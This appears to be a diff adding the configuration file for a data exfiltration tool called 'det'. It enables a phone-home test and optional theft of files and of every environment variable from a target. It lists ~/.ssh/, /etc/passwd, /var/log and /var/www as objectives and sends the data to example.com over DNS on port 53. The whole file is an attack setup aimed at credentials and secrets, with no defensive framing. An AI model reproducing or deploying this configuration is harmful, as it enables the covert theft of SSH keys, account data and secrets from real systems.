@@ -1,0 +1,16 @@
+# Configuration for det binary
+
+[missions]
+# `missions` describes application functionality. Enable any combination
+phone-home = true # Sends hello-world.txt to confirm the exfiltration works
+exfil-files = false # Exfils the folders mentioned in the `objectives` section
+exfil-env-vars = false # Exfil all environment variables from the target
+
+# `objectives` describes the files and folders to exfil. See [missions].exfil-files
+[objectives]
+files-and-folders = ["~/.ssh/", "/etc/passwd", "/var/log", "/var/www"]
+
+# `exfil-server` describes the server to exfil data to
+[exfil-server]
+main-domain = "example.com" # The domain to exfil data to
+port-no = 53 # This is the port to use for DNS
